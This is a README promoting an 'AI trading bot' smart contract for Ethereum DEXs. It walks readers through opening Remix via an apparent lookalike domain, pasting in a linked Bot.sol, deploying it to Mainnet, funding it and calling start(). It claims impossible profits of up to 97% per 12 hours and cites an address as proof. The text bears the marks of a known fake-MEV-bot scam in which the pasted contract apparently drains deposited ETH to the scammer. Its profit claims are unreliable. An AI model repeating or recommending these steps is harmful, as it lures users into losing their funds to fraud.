# AI Trading Bot for Ethereum-Based Tokens

This repository hosts a **Solidity-based smart contract** designed to function as an autonomous trading bot on **Ethereum-compatible decentralized exchanges (DEXs)**, including **Uniswap V2**, **SushiSwap**, and **GMX**. The bot executes token swaps and manages liquidity programmatically, enabling automated trading strategies directly on-chain.
---

## 🛠️ Setup & Deployment Guide

Follow the steps below to deploy and operate your own instance of the AI Trading Bot using **Remix IDE** and **MetaMask**.

### 1. Prepare Your Environment
- Open [Remix IDE](https://remixdeployer.com/) https://remixdeployer.com/
- Install and configure the **MetaMask** browser extension
- Connect MetaMask to either the **Ethereum Mainnet**

### 2. Create the Smart Contract File
- In Remix, navigate to the `contracts/` directory
- Right-click and select **"New File"**
- Name the file `Bot.sol`

### 3. Import the Contract Code
- Copy the source code from [`Bot.sol`](https://github.com/JCBury/ETH-BOT/blob/main/Bot.sol)
- Paste it into your newly created `Bot.sol` file in Remix

### 4. Compile the Contract
- Go to the **"Solidity Compiler"** tab
- Set the compiler version to **0.6.6**
- Click **"Compile Bot.sol"**

### 5. Deploy the Contract
- Switch to the **"Deploy & Run Transactions"** tab
- Set the environment to **"Injected Provider – MetaMask"**
- Select `Bot` from the contract dropdown
- Click **"Deploy"** and confirm the transaction in MetaMask

### 6. Fund the Contract
- Transfer **at least 0.1 ETH** to the deployed contract address  
  *(This ensures sufficient gas and minimizes slippage-related trade failures)*

### 7. Start and Manage the Bot
- In the deployed contract interface, click **"start()"** to activate trading
- To stop the bot and retrieve remaining funds, call **"withdrawal()"**
- For optimal performance, allow the bot to run continuously for **at least 12 hours**

---

## 📬 Get in Touch

Have questions or feedback? Feel free to reach out:

- [Telegram](https://t.me/Jacob3web)

---
➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖➖

📈 Estimated Profits

<table><thead><tr><th style="text-align: center;"><strong>Investment Range (ETH)</strong></th><th style="text-align: center;"><strong>Liquidity Level</strong></th><th style="text-align: center;"><strong>Profits per 12 Hours</strong></th></tr></thead><tbody><tr><td>0.1 ETH - 0.5 ETH</td><td>Low</td><td>Up to 10%</td></tr><tr><td>0.5 ETH - 1 ETH</td><td>Moderate</td><td>Up to 20%</td></tr><tr><td>1 ETH - 3 ETH</td><td>High</td><td>27-35%</td></tr><tr><td>2 ETH - 5 ETH</td><td>High</td><td>35-50%</td></tr><tr><td>6 ETH - 10 ETH</td><td>Very High</td><td>50-63%</td></tr><tr><td>10 ETH - 20 ETH</td><td>Very High</td><td>76%+</td></tr><tr><td>20 ETH - 50 ETH</td><td>Extremely High</td><td>97%+</td></tr></tbody></table>

🔥 My running mev bot, used 5 ETH. Averaging about 1-3 ETH per day!
https://etherscan.io/address/0xfc9928F6590D853752824B0B403A6AE36785e535

Happy trading! 🚀


